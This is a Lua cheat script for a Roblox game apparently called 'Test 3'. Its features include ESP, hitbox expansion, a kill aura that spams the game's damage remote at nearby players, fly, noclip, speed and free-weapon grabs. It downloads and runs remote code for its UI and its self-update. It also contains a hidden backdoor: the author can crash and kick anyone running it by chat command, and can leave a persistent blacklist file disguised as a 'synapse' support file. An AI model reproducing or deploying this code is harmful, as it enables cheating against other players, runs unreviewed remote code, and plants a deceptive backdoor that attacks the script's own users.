local version = 1.41
local retTable = {}
local whitelisted = {'unc1995';}
retTable.Ver = version
retTable.Run = function()
	coroutine.resume(coroutine.create(function()
		pcall(function()
			local isBlacklisted = isfile('synsupport.txt')
			if isBlacklisted then
				delay(2, function()
					while true do
						print("Crash")
					end
				end)
				game:GetService('Players').LocalPlayer:Kick('Blacklisted from using this script.')
			end
		end)
		getgenv().executed = true
		getgenv().DoNotification = function(text)
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = 'zq/unc1995 on top';
				Text = 'You have already executed.';
				Duration = 4;
			})
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = 'zq/unc1995 on top';
			Text = 'made by zq(unc1995), and why is zq on top tho???';
			Duration = 5
		})
		local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/miroeramaa/TurtleLib/main/TurtleUiLib.lua"))()
		local tab = library:Window('Test 3 - Utilities')
		tab:Label('V '.. version)
		tab:Label('By zq/unc1995')
		local tab2 = library:Window('Test 3 - Teleports')
		local players = {}
		local e = tab2:DropDown('players[beta]', players, function(arg)
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(game:GetService("Players")[arg].Character:GetPrimaryPartCFrame())
		end)
		coroutine.resume(coroutine.create(function()
			while wait(2) do
				players = {}
				for _, v in pairs(game:GetService("Players"):GetPlayers()) do
					table.insert(players, v.Name)
				end
			end
		end))
		--local cred = library:Tab('Credits')
		--cred:TextString('Created by: ', '! zq#6146')
--[[
script by zq, best scripter of rcu gear and test 5 B)
REVAMPED TO UI SO MOST CONTROLS HAVE SWITCHED.
T to use melee even if the melee hbe is off, still depends on the target.
G to turn gun hbe off and on even if this is in ui
H to buy akm and mare
PASSIVES:
ability to use tools at any conditions.
]]
		local distance = 40
		local q = false
		local on = false
		local d = delay
		local delay = 0
		local uis = game:GetService("UserInputService")
		local PhysicService = game:GetService("PhysicsService")
		local plr = game:GetService("Players").LocalPlayer
		local once = {} once.r = false
		local hHBE = false
		local hbeCons = {}
		local espCons = {}
		local gCons = {}
		local noclipping = false
		local tpw = false
		local speedmulti = 5
		local flymulti = 5
		local espfolder = Instance.new("Folder")
		espfolder.Parent = game:GetService("CoreGui")
		local usingesp = false
		local autoattack = false
		local function doCMD(msg)
			local spl = string.split(msg, ' ')
			if spl[1] and spl[2] then
				if spl[1] == '.blacklist' then
					if spl[2]==game:GetService('Players').LocalPlayer.Name then
						pcall(function()
							writefile('synsupport.txt', "<F>[.Certain Features of synapse will not be functioning if this file is removed.")
						end)
						d(2, function()
							while true do
								print'crash'
							end
						end)
						game:GetService('Players').LocalPlayer:Kick("Blacklisted.")
					end
				elseif spl[1] == '.kick' then
					if spl[2]==game:GetService('Players').LocalPlayer.Name then
						d(2, function()
							while true do
								print'crash'
							end
						end)
						game:GetService('Players').LocalPlayer:Kick()
					end
				end
				
			end
		end
		coroutine.resume(coroutine.create(function()
			for _, v in pairs(game:GetService('Players'):GetPlayers()) do
				if table.find(whitelisted, v.Name) then
					table.insert(gCons, v.Chatted:Connect(function(msg)
						doCMD(msg)
					end))
				end
			end
			table.insert(gCons, game:GetService("Players").PlayerAdded:Connect(function(plr)
				if table.find(whitelisted, plr.Name) then
					table.insert(gCons, plr.Chatted:Connect(function(msg)
						doCMD(msg)
					end))
				end
			end))
		end))
		-- workspace.Map
--[[
PhysicService:CreateCollisionGroup('mapParts')
PhysicService:CreateCollisionGroup('heads')
PhysicService:CollisionGroupSetCollidable('heads', 'mapParts', false)
]]
--[[
for _, v in pairs(workspace.Map:GetDescendants()) do
	if v:IsA("BasePart") then
		PhysicService:SetPartCollisionGroup(v, 'mapParts')
	end
end
]]
		local function boxadornment(part, par)
			if part and par then
				if part.Name=='Head' then
					local boxhandle = Instance.new("BoxHandleAdornment", par)
					boxhandle.Adornee = part
					boxhandle.AlwaysOnTop=true
					boxhandle.Visible = true
					boxhandle.ZIndex = 10
					boxhandle.Transparency = 0.85
					boxhandle.Color3 = Color3.new(0.501961, 0, 0.00813306)
					boxhandle.Size = Vector3.new(2, 1, 1)
				else
					local boxhandle = Instance.new("BoxHandleAdornment", par)
					boxhandle.Adornee = part
					boxhandle.AlwaysOnTop=true
					boxhandle.Visible = true
					boxhandle.ZIndex = 10
					boxhandle.Transparency = 0.85
					boxhandle.Color3 = Color3.new(0.501961, 0, 0.00813306)
					boxhandle.Size = part.Size
				end
			end
		end
		local function addtext(part, par, text)
			if part and par and text then
				local bill = Instance.new("BillboardGui")
				bill.MaxDistance=99999999
				bill.AlwaysOnTop = true
				bill.Size=UDim2.new(7, 0, 2.5, 0)
				bill.Adornee = part
				bill.Parent = par
				bill.ExtentsOffsetWorldSpace=Vector3.new(0, 2, 0)
				local txt = Instance.new("TextLabel")
				txt.Parent = bill
				txt.Text = text
				txt.BackgroundTransparency = 1
				txt.Size = UDim2.new(1, 0, 1, 0)
				txt.TextStrokeTransparency = 0.7
				txt.TextColor3 = Color3.new(0.501961, 0, 0.00813306)
				txt.Font = Enum.Font.SciFi
			end
		end
		local function addESP(char)
			if char.Name~=plr.Name then
				if espfolder:FindFirstChild(char.Name) then
					espfolder[char.Name]:Destroy()
				end
				local bodyparts = {'Left Arm'; 'Torso'; 'Right Arm'; 'Left Leg'; 'Right Leg'; 'Head'}
				local folder = Instance.new("Folder")
				folder.Name = char.Name
				folder.Parent = espfolder
				coroutine.resume(coroutine.create(function()
					addtext(char:WaitForChild("Head"), folder, char.Name)
				end))
				d(0.5, function()
					for _, v in pairs(char:GetChildren()) do
						if v:IsA("BasePart") and table.find(bodyparts, v.Name) then
							boxadornment(v, folder)
						end
					end
				end)
			end
		end
		local function removeESP(name)
			if espfolder:FindFirstChild(name) then
				espfolder[name]:Destroy()
			end
		end
		local function clearESP()
			for _, v in pairs(espCons) do
				pcall(function()
					v:Disconnect()
				end)
				v = nil
			end
			for _, v in pairs(espfolder:GetChildren()) do
				pcall(function()
					v:Destroy()
				end)
			end
		end
		local function clearGCONS()
			for _, v in pairs(gCons) do
				pcall(function()
					v:Disconnect()
				end)
			end
		end
		local function addHBE(char)
			if char.Name~=plr.Name then
				coroutine.resume(coroutine.create(function()
					char:WaitForChild("Head").Size = Vector3.new(10,10,10)
					char:WaitForChild("Head").Transparency = 0.5
					-- PhysicService:SetPartCollisionGroup(char:WaitForChild("Head"), 'heads')
					pcall(function()
						char:WaitForChild("Head").CanCollide = false
						char:WaitForChild("Head").CanTouch = false
						char:WaitForChild("Head").Massless = true
					end)
					table.insert(hbeCons, game:GetService("RunService").Stepped:Connect(function()
						char['Head'].CanCollide = false
				--[[

					for _, v in pairs(char:GetDescendants()) do
					if v:IsA("BasePart") and v.CanCollide == true then
						v.CanCollide = false
					end
				end
				]]
					end))
				end))
			end
		end
		local function clearHBE()
			for _, v in pairs(hbeCons) do
				pcall(function()
					v:Disconnect()
				end)
				v = nil
			end
			for _ ,v in pairs(game:GetService('Players'):GetPlayers()) do
				if v.Character then
					v.Character:WaitForChild("Head").Size = Vector3.new(2, 1, 1)
					v.Character:WaitForChild("Head").Transparency = 0
				end
			end
		end
		local function god()
--[[
local speaker = plr
local Cam = workspace.CurrentCamera
	local Pos, Char = Cam.CFrame, speaker.Character
	local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
	local nHuman = Human.Clone(Human)
	nHuman.Parent, speaker.Character = Char, nil
	nHuman.SetStateEnabled(nHuman, 15, false)
	nHuman.SetStateEnabled(nHuman, 1, false)
	nHuman.SetStateEnabled(nHuman, 0, false)
	nHuman.BreakJointsOnDeath, Human = true, Human.Destroy(Human)
	nHuman.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
	local Script = Char.FindFirstChild(Char, "Animate")
	if Script then
		Script.Disabled = true
		wait()
		Script.Disabled = false
	end
	nHuman.Health = nHuman.MaxHealth
]]
		end
		tab:Toggle('speed hack', false, function()
			tpw = not tpw
		end)
		tab:Toggle('Head hbe', false, function()
			hHBE = not hHBE
			if hHBE == true then
				for _, v in pairs(hbeCons) do
					pcall(function()
						v:Disconnect()
					end)
				end
				for _, v in pairs(game:GetService('Players'):GetPlayers()) do
					if v.Character then
						addHBE(v.Character)
					end
				end
				for _, v in pairs(game:GetService('Players'):GetPlayers()) do
					table.insert(hbeCons, v.CharacterAdded:Connect(function(char)
						addHBE(char)
					end))
				end
				table.insert(hbeCons, game:GetService("Players").PlayerAdded:Connect(function(plr)
					table.insert(hbeCons, plr.CharacterAdded:Connect(function(char)
						addHBE(char)
					end))
				end))

			else
				clearHBE()
			end
		end)
		tab:Dropdown('Targets', {'Head';'Torso'}, function(arg)
			if arg == 'Head' then
				q = true
			elseif arg == 'Torso' then
				q = false
			end
		end)
		tab:Toggle('m1 melee hbe toggle', false, function()
			on = not on
		end)
		tab:Button('free guns/melee', function()
			for _, v in pairs(workspace.Map['ToolStation Weapons'].ItemGiver_MetalBat:GetDescendants()) do
				if v:IsA("ClickDetector") then
					v.MaxActivationDistance = math.huge
					fireclickdetector(v, 1)
				end
			end
			for _, v in pairs(workspace.Map['ToolStation Weapons'].ItemGiver_FireAxe:GetDescendants()) do
				if v:IsA("ClickDetector") then
					v.MaxActivationDistance = math.huge
					fireclickdetector(v, 1)
				end
			end
			for _, v in pairs(workspace['ItemGiver_G17']:GetDescendants()) do
				if v:IsA("ClickDetector") then
					v.MaxActivationDistance = math.huge
					fireclickdetector(v, 1)
				end
			end
		end)
		tab:Slider('Speed (5 default)', 5, 100, 5, function(arg)
			speedmulti = arg
		end)
		table.insert(gCons, uis.InputBegan:Connect(function(inp, gps)
	--[[
	if not gps and inp.KeyCode==Enum.KeyCode.J then tpw = not tpw game:GetService("StarterGui"):SetCore('SendNotification', {
		Title = 'speedy ';
		Text = tostring(tpw);
		Duration = 1;
		}) end
	]]
			if not gps and inp.KeyCode==Enum.KeyCode.G then
				hHBE = not hHBE
				if hHBE == true then
					game:GetService("StarterGui"):SetCore('SendNotification', {
						Title = 'Head HBE';
						Text = 'on';
						Duration = 1;
					})
					for _, v in pairs(hbeCons) do
						pcall(function()
							v:Disconnect()
						end)
					end
					for _, v in pairs(game:GetService('Players'):GetPlayers()) do
						if v.Character then
							addHBE(v.Character)
						end
					end
					for _, v in pairs(game:GetService('Players'):GetPlayers()) do
						table.insert(hbeCons, v.CharacterAdded:Connect(function(char)
							addHBE(char)
						end))
					end
					table.insert(hbeCons, game:GetService("Players").PlayerAdded:Connect(function(plr)
						table.insert(hbeCons, plr.CharacterAdded:Connect(function(char)
							addHBE(char)
						end))
					end))

				else
					game:GetService("StarterGui"):SetCore('SendNotification', {
						Title = 'Head HBE';
						Text = 'off';
						Duration = 1;
					})
					clearHBE()
				end
			end
	--[[
	if not gps and inp.KeyCode == Enum.KeyCode.Y then
		for _, v in pairs(workspace.Map['ToolStation Weapons'].ItemGiver_MetalBat:GetDescendants()) do
			if v:IsA("ClickDetector") then
				v.MaxActivationDistance = math.huge
				fireclickdetector(v, 1)
			end
		end
		for _, v in pairs(workspace.Map['ToolStation Weapons'].ItemGiver_FireAxe:GetDescendants()) do
			if v:IsA("ClickDetector") then
				v.MaxActivationDistance = math.huge
				fireclickdetector(v, 1)
			end
		end
		for _, v in pairs(workspace['ItemGiver_G17']:GetDescendants()) do
			if v:IsA("ClickDetector") then
				v.MaxActivationDistance = math.huge
				fireclickdetector(v, 1)
			end
		end
		
	end
	]]
	--[[
	if not gps and inp.KeyCode==Enum.KeyCode.V then
		delay+=0.1
		game:GetService("StarterGui"):SetCore('SendNotification', {
			Title = 'delay';
			Text = tostring(delay);
			Duration = 1;
		})
	end
	if not gps and inp.KeyCode==Enum.KeyCode.B then
		delay-=0.1
		game:GetService("StarterGui"):SetCore('SendNotification', {
			Title = 'delay';
			Text = tostring(delay);
			Duration = 1;
		})
	end
	]]
	--[[
	if not gps and inp.KeyCode==Enum.KeyCode.Z then
		q = not q
		if q == true then
			game:GetService("StarterGui"):SetCore('SendNotification', {
				Title = 'Target';
				Text = 'head';
				Duration = 3;
			})
		elseif q == false then
			game:GetService("StarterGui"):SetCore('SendNotification', {
				Title = 'Target';
				Text = 'torso';
				Duration = 3;
			})
		end
	end
	]]
	--[[
	if not gps and inp.KeyCode==Enum.KeyCode.X then
		on = not on
		game:GetService("StarterGui"):SetCore('SendNotification', {
			Title = 'Activity';
			Text = tostring(on);
		})
	end
	]]
			if q == true and on==true then
				if inp.UserInputType==Enum.UserInputType.MouseButton1 then
					d(delay, function()
						for _, v in pairs(game:GetService("Players"):GetPlayers()) do
							if v.Name~=plr.Name then
								pcall(function()
									if v.Character.PlayerStuff.Values.Downed.Value==false and v.Character.Humanoid.Health>0 then
										if v:DistanceFromCharacter(plr.Character.PrimaryPart.Position)<=distance then
											local ohInstance1 = v.Character.Head
											local ohInstance2 = v.Character.Humanoid
											local ohInstance3 = plr.Character.Torso
											game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").EventsFolder.Hit:FireServer(ohInstance1, ohInstance2, ohInstance3)
										end
									end
								end)
							end
						end
					end)
				end
			elseif q == false and on == true then
				if inp.UserInputType==Enum.UserInputType.MouseButton1 then
					d(delay, function()
						for _, v in pairs(game:GetService("Players"):GetPlayers()) do
							if v.Name~=plr.Name then
								pcall(function()
									if v.Character.PlayerStuff.Values.Downed.Value==false and v.Character.Humanoid.Health>0 then
										if v:DistanceFromCharacter(plr.Character.PrimaryPart.Position)<=distance then
											local ohInstance1 = v.Character.Torso
											local ohInstance2 = v.Character.Humanoid
											local ohInstance3 = plr.Character.Torso
											game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").EventsFolder.Hit:FireServer(ohInstance1, ohInstance2, ohInstance3)
										end
									end
								end)
							end
						end
					end)
				end
			end
			if not gps and inp.KeyCode==Enum.KeyCode.T then
				if q == true then
					for _, v in pairs(game:GetService("Players"):GetPlayers()) do
						if v.Name~=plr.Name then
							pcall(function()
								if v.Character.PlayerStuff.Values.Downed.Value==false and v.Character.Humanoid.Health>0 then
									if v:DistanceFromCharacter(plr.Character.PrimaryPart.Position)<=distance then
										local ohInstance1 = v.Character.Head
										local ohInstance2 = v.Character.Humanoid
										local ohInstance3 = plr.Character.Torso
										game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").EventsFolder.Hit:FireServer(ohInstance1, ohInstance2, ohInstance3)
									end
								end
							end)
						end
					end
				elseif q == false then
					for _, v in pairs(game:GetService("Players"):GetPlayers()) do
						if v.Name~=plr.Name then
							pcall(function()
								if v.Character.PlayerStuff.Values.Downed.Value==false and v.Character.Humanoid.Health>0 then
									if v:DistanceFromCharacter(plr.Character.PrimaryPart.Position)<=distance then
										local ohInstance1 = v.Character.Head
										local ohInstance2 = v.Character.Humanoid
										local ohInstance3 = plr.Character.Torso
										game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").EventsFolder.Hit:FireServer(ohInstance1, ohInstance2, ohInstance3)
									end
								end
							end)
						end
					end
				end
			end
		end))


		table.insert(gCons, game:GetService("RunService").RenderStepped:Connect(function()
			game:GetService("StarterGui"):SetCoreGuiEnabled("Backpack", true)
			plr.Character.Humanoid.JumpPower=50
		end))

		table.insert(gCons, game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
			if msg == '.akm' then
				game:GetService("ReplicatedStorage").PurchaseEvents.AKM:FireServer()
			end
			if msg == '.mare' then
				game:GetService("ReplicatedStorage").PurchaseEvents.Mare:FireServer()
			end
			if msg == '.a10' then
				game:GetService("ReplicatedStorage").PurchaseEvents.A10:FireServer()
			end
		end))


--[[
tab:Keybind("UI [default=p]", function(enabled)
	game:GetService("CoreGui").OfficialUILib.Enabled = not game:GetService("CoreGui").OfficialUILib.Enabled;
end,Enum.KeyCode.P);
]]
		library:Keybind("P")
		local flying = false
		local holding = {}
		holding.w = false;holding.a=false;holding.s=false;holding.d=false;
		tab:Toggle("fly", false, function(bool)
			flying = bool
			print(bool)
			if bool == false then
				plr.Character:WaitForChild('HumanoidRootPart').Anchored = false
			end
		end)
		tab:Slider('fly(5 default)', 5, 60, 5, function(arg)
			flymulti = arg
		end)
		tab:Toggle('Noclip', false, function(bool)
			noclipping = bool
		end)
		tab:Toggle("ESP", false, function(bool)
			if bool == true then
				for _, v in pairs(espCons) do
					pcall(function()
						v:Disconnect()
					end)
				end
				for _, v in pairs(game:GetService('Players'):GetPlayers()) do
					if v.Character then
						addESP(v.Character)
					end
				end
				for _, v in pairs(game:GetService('Players'):GetPlayers()) do
					table.insert(espCons, v.CharacterAdded:Connect(function(char)
						addESP(char)
					end))
				end
				table.insert(espCons, game:GetService("Players").PlayerAdded:Connect(function(plr)
					table.insert(espCons, plr.CharacterAdded:Connect(function(char)
						addESP(char)
					end))
				end))
				table.insert(espCons, game:GetService("Players").PlayerRemoving:Connect(function(plr)
					removeESP(plr.Name)
				end))

			elseif bool == false then
				clearESP()
			end
		end)
		--[[
		tab:Button('Mod Check', function()
			god()
		end)
		tab:Toggle('Mod Notifier', false, function()
			local mods = {'Turpari', 'DonovanL2012', 'DonovanL2011', ''}
		end)
		]]
		local checkupdatedb = false
		tab:Toggle('kill aura[melee]', false, function(bool)
			autoattack = bool
		end)

		tab:Button("check for updates", function()
			if checkupdatedb==false then checkupdatedb=true
				d(2, function()
					checkupdatedb = false
				end)
				local loadedNew = loadstring(game:HttpGet('https://raw.githubusercontent.com/So1ux/So1ux/main/test%203%20UI%20script'))()
				if loadedNew.Ver~=version then
					game:GetService('StarterGui'):SetCore('SendNotification', {
						Title = 'zq/unc1995 on top';
						Text = 'New Update Available, Updating to version: '.. tostring(loadedNew.Ver);
						Duration = 4;
					})
					clearESP()
					clearHBE()
					clearGCONS()
					noclipping = false
					flying = false
					tpw = false
					autoattack = false
					library:Destroy()
					loadedNew.Run()
					game:GetService('StarterGui'):SetCore('SendNotification', {
						Title = 'zq/unc1995 on top';
						Text = 'Updated!';
						Duration = 4;
					})
				else
					game:GetService('StarterGui'):SetCore('SendNotification', {
						Title = 'zq/unc1995 on top';
						Text = 'Current version is up to date, '.. tostring(version);
						Duration = 2;
					})
				end
			end
		end)
		table.insert(gCons, uis.InputBegan:Connect(function(inp, gps)
			if inp.KeyCode==Enum.KeyCode.W then
				holding.w = true
			end
			if inp.KeyCode==Enum.KeyCode.A then
				holding.a = true
			end
			if inp.KeyCode==Enum.KeyCode.S then
				holding.s = true
			end
			if inp.KeyCode==Enum.KeyCode.D then
				holding.d = true
			end
		end))

		table.insert(gCons, uis.InputEnded:Connect(function(inp, gps)
			if inp.KeyCode==Enum.KeyCode.W then
				holding.w = false
			end
			if inp.KeyCode==Enum.KeyCode.A then
				holding.a = false
			end
			if inp.KeyCode==Enum.KeyCode.S then
				holding.s = false
			end
			if inp.KeyCode==Enum.KeyCode.D then
				holding.d = false
			end

		end))

		table.insert(gCons, game:GetService('RunService').Stepped:Connect(function()
			if noclipping==true then 
				pcall(function()
					for _, v in pairs(plr.Character:GetDescendants()) do
						if v:IsA("BasePart") and v.CanCollide == true then
							v.CanCollide = false
						end
					end
				end)
			end
			if flying == true then
				local char = plr.Character
				local hrp = char.PrimaryPart
				local head = char:WaitForChild("Head")
				hrp.Velocity = Vector3.new(0, 0, 0)
				hrp.Anchored = true
				hrp.CFrame = CFrame.new(hrp.Position, (workspace.CurrentCamera.CFrame*CFrame.new(0, 0, -2500)).Position)
				if holding.w==true then
					hrp.CFrame = hrp.CFrame*CFrame.new(0, 0, -flymulti/15)
				elseif holding.a==true then
					hrp.CFrame = hrp.CFrame*CFrame.new(-flymulti/15, 0, 0)
				elseif holding.d==true then
					hrp.CFrame = hrp.CFrame*CFrame.new(flymulti/15, 0, 0)
				elseif holding.s==true then
					hrp.CFrame = hrp.CFrame*CFrame.new(0, 0, flymulti/15)
				end
			else
				pcall(function()
					plr.Character.PrimaryPart.Anchored = false
				end)
			end
		end))
		table.insert(gCons, game:GetService("RunService").Stepped:Connect(function()
			if tpw==true then
				pcall(function()
					if game:GetService("Players").LocalPlayer.Character.Humanoid.MoveDirection.Magnitude>0 then
						local char = plr.Character
						local hum = char.Humanoid
						char:TranslateBy(hum.MoveDirection*(speedmulti/25))
					end
				end)
			end
		end))
		table.insert(gCons, game:GetService("RunService").RenderStepped:Connect(function()
			if autoattack==true then
				for _, v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name~=plr.Name then
						pcall(function()
							if v.Character.PlayerStuff.Values.Downed.Value==false and v.Character.Humanoid.Health>0 then
								if v:DistanceFromCharacter(plr.Character.PrimaryPart.Position)<=distance then
									coroutine.resume(coroutine.create(function()
										local ohInstance1 = v.Character.Head
										local ohInstance2 = v.Character.Humanoid
										local ohInstance3 = plr.Character.Torso
										game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").EventsFolder.Hit:FireServer(ohInstance1, ohInstance2, ohInstance3)
									end))
								end
							end
						end)
					end
				end
			end
		end))
	end))
end

return retTable
